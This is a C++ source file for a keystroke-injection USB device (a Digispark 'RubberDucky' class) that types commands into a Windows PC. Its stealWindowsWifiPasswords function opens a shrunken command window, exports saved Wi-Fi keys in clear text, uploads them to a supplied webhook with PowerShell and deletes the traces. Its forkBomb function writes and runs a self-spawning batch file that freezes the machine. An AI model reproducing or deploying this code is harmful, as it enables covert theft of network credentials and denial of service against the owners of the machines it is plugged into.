/**
 * @file RubberDucky.cpp
 * @brief Implementation of the RubberDucky class functions.
 */

#include "RubberDucky.h"

#define LAYOUT_ITALIAN
#include "DigiKeyboard.h"

RubberDucky::RubberDucky(uint8_t ledPin) : ledPin(ledPin) {}

void RubberDucky::init(void) {
  pinMode(this->ledPin, OUTPUT);
}

void RubberDucky::ledFeedback(const long ms) {
  digitalWrite(this->ledPin, HIGH);
  DigiKeyboard.delay(ms);
  digitalWrite(this->ledPin, LOW);
  DigiKeyboard.delay(ms);
}

void RubberDucky::refreshUSBConnection(void) {
  // Keep USB connection
  DigiKeyboard.update();

  // Release all keys
  DigiKeyboard.sendKeyStroke(0);

  // Waiting for 2 seconds
  DigiKeyboard.delay(2000);
}

void RubberDucky::launchCMD(bool debug) {
  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // `Win + R`
  DigiKeyboard.delay(1250);

  // Launch CMD (in minimized mode if not in debug)
  if (debug) {
    DigiKeyboard.print("cmd");
  } else {
    // Overview:
    // - `cmd /k` launches a prompt, leaving it open after running the next command.
    // - `mode con:` set console parameters.
    // - `cols=15` set the width to 15 columns.
    // - `lines=1` set height to 1 line.
    DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  }
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(1250);
}

void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
  // Open Run dialog and launch CMD
  launchCMD(debug);

  // Navigate to temp directory and prepare workspace
  DigiKeyboard.print("cd %temp% && mkdir RubberDucky && cd RubberDucky");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(500);

  // Export saved Wi-Fi profiles
  DigiKeyboard.print("netsh wlan export profile key=clear");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(500);

  // Extract passwords and store them in a file
  DigiKeyboard.print("powershell Select-String -Path Wi*.xml -Pattern \"keyMaterial\" > Wi-Fi-Passwd.txt");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(7000);

  // Send the file to the webhook via HTTP POST
  DigiKeyboard.print("powershell Invoke-WebRequest -Uri \"");
  DigiKeyboard.print(webhook);
  DigiKeyboard.print("\" -Method POST -InFile \"Wi-Fi-Passwd.txt\"");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(10000);

  // Cleaning up all
  DigiKeyboard.print("cd .. && rmdir /s /q RubberDucky");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(500);

  // Exit terminal
  DigiKeyboard.print("exit");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(100);
}

void RubberDucky::forkBomb(bool debug) {
  // Open Run dialog and launch CMD
  launchCMD(debug);

  // Creating payload to a temporary directory
  DigiKeyboard.print("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(500);

  // Executing the fork bomb
  DigiKeyboard.print("cd %temp% && ouch.bat");
  DigiKeyboard.write('\n');
  DigiKeyboard.delay(500);
}
